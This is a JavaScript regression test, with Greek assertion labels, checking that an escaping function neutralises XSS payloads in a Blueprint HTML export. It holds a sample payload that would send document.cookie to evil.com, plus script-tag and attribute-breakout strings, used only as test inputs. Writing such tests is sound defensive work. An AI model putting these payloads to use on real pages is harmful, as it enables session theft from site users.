// SECURITY REGRESSION TEST — XSS in Blueprint HTML export (confirmed, now fixed)
const esc = s => String(s == null ? "" : s)
  .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
  .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
let passed = 0, failed = 0;
function assert(l, c) { if (c) { passed++; console.log("PASS —", l); } else { failed++; console.log("FAIL —", l); } }

const payload = `<img src=x onerror="fetch('https://evil.com?d='+document.cookie)">`;
const out = `<div class="path-text">${esc(payload)}</div>`;
assert("XSS payload ΕΞΟΥΔΕΤΕΡΩΘΗΚΕ (κανένα εκτελέσιμο tag)", !/<img[^>]*onerror/i.test(out));
assert("script tag ΕΞΟΥΔΕΤΕΡΩΘΗΚΕ", !/<script/i.test(`<div>${esc("<script>alert(1)</script>")}</div>`));
assert("Attribute escape (διαφυγή από class=\"...\")", !esc(`" onmouseover="alert(1)`).includes('"'));
assert("Κανονικό ελληνικό κείμενο ΔΕΝ αλλοιώνεται",
  esc("Με ψυχραιμία όλα λύνονται") === "Με ψυχραιμία όλα λύνονται");
assert("Ελληνικό ερωτηματικό διατηρείται", esc("Τι θέλω;") === "Τι θέλω;");
assert("null δεν κρασάρει / δεν τυπώνει 'null'", esc(null) === "");
assert("Ampersand escape σωστά (όχι διπλό escaping)", esc("A & B") === "A &amp; B");

console.log("\n" + passed + " passed, " + failed + " failed");
process.exit(failed > 0 ? 1 : 0);
